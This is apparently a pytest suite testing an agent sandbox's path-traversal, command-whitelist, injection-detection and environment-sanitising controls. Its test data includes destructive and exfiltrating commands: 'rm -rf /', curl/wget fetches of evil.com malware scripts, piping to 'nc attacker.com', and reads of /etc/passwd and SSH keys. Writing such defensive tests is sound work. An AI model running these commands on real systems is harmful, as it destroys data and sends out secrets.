"""
Security Validation Test Suite
Tests for security controls, input validation, and vulnerability prevention.
"""
import pytest
import os
import subprocess
from pathlib import Path
from unittest.mock import Mock, patch

from agent_system.sandbox import TestSandbox, SandboxConfig, SecurityError


class TestPathTraversalProtection:
    """Test path traversal attack prevention."""

    def test_rejects_parent_directory_traversal(self):
        """Should reject paths with .. that escape allowed directories."""
        sandbox = TestSandbox()

        malicious_paths = [
            "../../../etc/passwd",
            "tests/../../etc/shadow",
            "tests/../../../home/user/.ssh/id_rsa",
            "./tests/../../../../etc/hosts",
        ]

        for path in malicious_paths:
            assert not sandbox.validate_path(path), f"Failed to reject: {path}"

    def test_rejects_absolute_paths_outside_project(self):
        """Should reject absolute paths outside allowed directories."""
        sandbox = TestSandbox()

        malicious_paths = [
            "/etc/passwd",
            "/home/user/.ssh/id_rsa",
            "/var/log/syslog",
            "/root/.bashrc",
        ]

        for path in malicious_paths:
            assert not sandbox.validate_path(path), f"Failed to reject: {path}"

    def test_accepts_valid_test_paths(self):
        """Should accept valid paths within allowed directories."""
        sandbox = TestSandbox()

        valid_paths = [
            "tests/auth.spec.ts",
            "tests/core_nav.spec.ts",
            "tests/e2e/checkout.spec.ts",
            "artifacts/screenshot.png",
        ]

        for path in valid_paths:
            # Create path if it doesn't exist
            test_path = Path(path)
            test_path.parent.mkdir(parents=True, exist_ok=True)
            test_path.touch(exist_ok=True)

            assert sandbox.validate_path(path), f"Failed to accept valid path: {path}"

            # Cleanup
            if test_path.exists():
                test_path.unlink()

    def test_rejects_symlink_escape(self):
        """Should reject symlinks that point outside allowed directories."""
        sandbox = TestSandbox()

        # Create a symlink to /etc (if running as non-root, this may fail gracefully)
        symlink_path = Path("tests/malicious_symlink")
        symlink_path.parent.mkdir(parents=True, exist_ok=True)

        try:
            if symlink_path.exists():
                symlink_path.unlink()

            symlink_path.symlink_to("/etc/passwd")

            # Should reject the symlink
            assert not sandbox.validate_path(str(symlink_path)), \
                "Failed to reject symlink to /etc/passwd"

        except PermissionError:
            # Expected on some systems, pass the test
            pytest.skip("Cannot create symlink (permission denied)")
        except OSError as e:
            pytest.skip(f"Cannot create symlink: {e}")
        finally:
            if symlink_path.exists():
                symlink_path.unlink()

    def test_normalized_path_resolution(self):
        """Should resolve paths and check against normalized allowed directories."""
        sandbox = TestSandbox()

        # These should all resolve to valid paths within tests/
        tricky_but_valid = [
            "tests/./auth.spec.ts",  # Current directory marker
            "tests/e2e/../auth.spec.ts",  # Parent reference within tests/
        ]

        for path in tricky_but_valid:
            # Create path
            test_path = Path(path).resolve()
            test_path.parent.mkdir(parents=True, exist_ok=True)
            test_path.touch(exist_ok=True)

            assert sandbox.validate_path(path), f"Failed to accept normalized path: {path}"

            # Cleanup
            if test_path.exists():
                test_path.unlink()


class TestCommandInjection:
    """Test command injection attack prevention."""

    def test_rejects_unauthorized_commands(self):
        """Should reject commands not in whitelist."""
        sandbox = TestSandbox()

        malicious_commands = [
            ['rm', '-rf', '/'],
            ['sudo', 'rm', '-rf', '/'],
            ['curl', 'http://evil.com/malware.sh'],
            ['wget', 'http://evil.com/malware.sh'],
            ['python', '-c', 'import os; os.system("rm -rf /")'],
            ['sh', '-c', 'rm -rf /'],
            ['bash', '-c', 'cat /etc/passwd'],
        ]

        for cmd in malicious_commands:
            with pytest.raises(SecurityError):
                sandbox.sanitize_command(cmd)

    def test_accepts_whitelisted_commands(self):
        """Should accept commands in whitelist."""
        sandbox = TestSandbox()

        valid_commands = [
            ['npx', 'playwright', 'test', 'tests/auth.spec.ts'],
            ['playwright', 'test', '--reporter=json'],
            ['node', 'tests/script.js'],
        ]

        for cmd in valid_commands:
            sanitized = sandbox.sanitize_command(cmd)
            assert sanitized == cmd

    def test_detects_shell_injection_patterns(self):
        """Should detect dangerous patterns in command arguments."""
        sandbox = TestSandbox()

        # These contain shell injection patterns
        injection_patterns = [
            ['npx', 'playwright', 'test', 'file.spec.ts; rm -rf /'],
            ['npx', 'playwright', 'test', 'file.spec.ts && cat /etc/passwd'],
            ['npx', 'playwright', 'test', 'file.spec.ts | nc attacker.com 1234'],
            ['npx', 'playwright', 'test', '`whoami`'],
            ['npx', 'playwright', 'test', '$((cat /etc/passwd))'],
        ]

        for cmd in injection_patterns:
            # Should at least warn (sandbox currently logs warnings)
            # In strict mode, should raise SecurityError
            sanitized = sandbox.sanitize_command(cmd)
            # Verify patterns are logged as warnings
            assert sanitized == cmd  # Current implementation allows but warns


class TestResourceLimits:
    """Test resource limit enforcement."""

    def test_enforces_timeout(self, tmp_path):
        """Should timeout long-running tests."""
        # NOTE: This test would require a real test file in allowed directories
        # For now, we skip it as it tests actual execution behavior
        # which is covered by integration tests
        pytest.skip("Requires real test file in allowed directory - covered by integration tests")

    @pytest.mark.skipif(os.name == 'nt', reason="Resource limits not supported on Windows")
    def test_enforces_memory_limit(self):
        """Should kill process that exceeds memory limit."""
        # Note: This test requires actual execution, may not be reliable in CI
        config = SandboxConfig(max_memory_mb=512)  # Low limit for testing
        sandbox = TestSandbox(config)

        # In a real test, would create a memory-intensive test
        # For now, just verify config is set correctly
        assert sandbox.config.max_memory_mb == 512

    @pytest.mark.skipif(os.name == 'nt', reason="Resource limits not supported on Windows")
    def test_sets_cpu_limit(self):
        """Should enforce CPU time limits."""
        config = SandboxConfig(max_cpu_seconds=60)
        sandbox = TestSandbox(config)

        assert sandbox.config.max_cpu_seconds == 60


class TestEnvironmentSanitization:
    """Test environment variable sanitization."""

    def test_removes_api_keys_from_test_env(self):
        """Should remove API keys from subprocess environment."""
        sandbox = TestSandbox()

        # Set API keys in current environment
        os.environ['ANTHROPIC_API_KEY'] = 'sk-ant-test-key'
        os.environ['OPENAI_API_KEY'] = 'sk-test-key'
        os.environ['GEMINI_API_KEY'] = 'test-gemini-key'
        os.environ['REDIS_PASSWORD'] = 'test-redis-password'

        sanitized_env = sandbox._get_sandboxed_env()

        # API keys should not be in sanitized environment
        assert 'ANTHROPIC_API_KEY' not in sanitized_env
        assert 'OPENAI_API_KEY' not in sanitized_env
        assert 'GEMINI_API_KEY' not in sanitized_env
        assert 'REDIS_PASSWORD' not in sanitized_env

        # Cleanup
        for key in ['ANTHROPIC_API_KEY', 'OPENAI_API_KEY', 'GEMINI_API_KEY', 'REDIS_PASSWORD']:
            if key in os.environ:
                del os.environ[key]

    def test_preserves_necessary_env_vars(self):
        """Should keep necessary environment variables for test execution."""
        sandbox = TestSandbox()

        os.environ['BASE_URL'] = 'http://localhost:3000'
        os.environ['PLAYWRIGHT_BROWSERS_PATH'] = '/path/to/browsers'

        sanitized_env = sandbox._get_sandboxed_env()

        # These should be preserved
        assert 'PATH' in sanitized_env
        assert 'BASE_URL' in sanitized_env
        assert sanitized_env['BASE_URL'] == 'http://localhost:3000'

        # Cleanup
        for key in ['BASE_URL', 'PLAYWRIGHT_BROWSERS_PATH']:
            if key in os.environ:
                del os.environ[key]


class TestInputValidation:
    """Test input validation and sanitization."""

    def test_validates_test_path_format(self):
        """Should validate test path has correct format."""
        sandbox = TestSandbox()

        # Valid test paths
        valid_paths = [
            "tests/auth.spec.ts",
            "tests/e2e/checkout.spec.ts",
            "tests/integration/api.spec.ts",
        ]

        for path in valid_paths:
            # Create path
            test_path = Path(path)
            test_path.parent.mkdir(parents=True, exist_ok=True)
            test_path.touch(exist_ok=True)

            assert sandbox.validate_path(path)

            # Cleanup
            if test_path.exists():
                test_path.unlink()

    def test_rejects_non_typescript_files(self):
        """Should only accept TypeScript test files (when file type validation is enabled)."""
        # This is a recommendation, not currently enforced
        # But good to test for future implementation

        invalid_extensions = [
            "tests/malicious.sh",
            "tests/exploit.py",
            "tests/hack.exe",
            "tests/payload.bin",
        ]

        # When file type validation is implemented:
        # for path in invalid_extensions:
        #     with pytest.raises(SecurityError):
        #         validate_file_type(path)

        # For now, just document the expected behavior
        pytest.skip("File type validation not yet implemented - documented for future")


class TestSecurityLogging:
    """Test security event logging."""

    def test_logs_path_validation_failures(self):
        """Should log security events for path validation failures."""
        sandbox = TestSandbox()

        with patch('agent_system.sandbox.logger') as mock_logger:
            # Attempt malicious path
            result = sandbox.validate_path("../../../etc/passwd")

            assert not result
            # Should have logged a warning
            assert mock_logger.warning.called

    def test_logs_command_sanitization_warnings(self):
        """Should log warnings for dangerous command patterns."""
        sandbox = TestSandbox()

        with patch('agent_system.sandbox.logger') as mock_logger:
            # Command with dangerous pattern
            cmd = ['npx', 'playwright', 'test', 'file.spec.ts; rm -rf /']

            try:
                sandbox.sanitize_command(cmd)
                # Should log warning about dangerous pattern
                assert mock_logger.warning.called
            except SecurityError:
                # Also acceptable to reject outright
                pass


class TestSandboxConfiguration:
    """Test sandbox configuration and defaults."""

    def test_default_configuration(self):
        """Should have secure defaults."""
        sandbox = TestSandbox()

        # Verify secure defaults
        assert sandbox.config.max_cpu_seconds == 300  # 5 minutes
        assert sandbox.config.max_memory_mb == 2048  # 2GB
        assert sandbox.config.max_execution_time_seconds == 60  # 1 minute
        assert sandbox.config.max_file_size_mb == 100  # 100MB
        assert sandbox.config.max_processes == 100

        # Verify allowed directories
        assert './tests' in sandbox.config.allowed_dirs
        assert './artifacts' in sandbox.config.allowed_dirs

        # Verify allowed commands
        assert 'npx' in sandbox.config.allowed_commands
        assert 'playwright' in sandbox.config.allowed_commands

    def test_custom_configuration(self):
        """Should accept custom configuration."""
        config = SandboxConfig(
            max_cpu_seconds=120,
            max_memory_mb=1024,
            max_execution_time_seconds=30,
            allowed_dirs=['./tests', './custom'],
            allowed_commands={'npx', 'node'}
        )

        sandbox = TestSandbox(config)

        assert sandbox.config.max_cpu_seconds == 120
        assert sandbox.config.max_memory_mb == 1024
        assert sandbox.config.max_execution_time_seconds == 30
        assert './custom' in sandbox.config.allowed_dirs
        assert 'node' in sandbox.config.allowed_commands


class TestSecurityErrors:
    """Test security error handling."""

    def test_raises_security_error_on_invalid_path(self):
        """Should raise SecurityError for invalid paths during execution."""
        sandbox = TestSandbox()

        with pytest.raises(SecurityError):
            sandbox.execute_test("../../../etc/passwd")

    def test_raises_security_error_on_invalid_command(self):
        """Should raise SecurityError for unauthorized commands."""
        sandbox = TestSandbox()

        with pytest.raises(SecurityError):
            sandbox.sanitize_command(['rm', '-rf', '/'])

    def test_returns_error_dict_on_security_violation(self):
        """Should raise SecurityError for invalid paths."""
        sandbox = TestSandbox()

        # Should raise SecurityError, not return error dict
        with pytest.raises(SecurityError):
            sandbox.execute_test("../../../etc/passwd")


# Integration tests
class TestSecurityIntegration:
    """Integration tests for security controls."""

    def test_runner_agent_uses_sandbox(self):
        """RunnerAgent should use TestSandbox for execution."""
        # This will be implemented when RunnerAgent is updated
        pytest.skip("Runner integration pending - will implement after sandbox integration")

    def test_medic_agent_validates_paths(self):
        """MedicAgent should validate file paths before reading/writing."""
        # This will be implemented when MedicAgent is updated
        pytest.skip("Medic integration pending - will implement after sandbox integration")

    def test_cli_sanitizes_inputs(self):
        """CLI should sanitize user inputs before processing."""
        # This will be implemented when CLI is updated
        pytest.skip("CLI integration pending - will implement after input sanitization")


if __name__ == '__main__':
    pytest.main([__file__, '-v'])
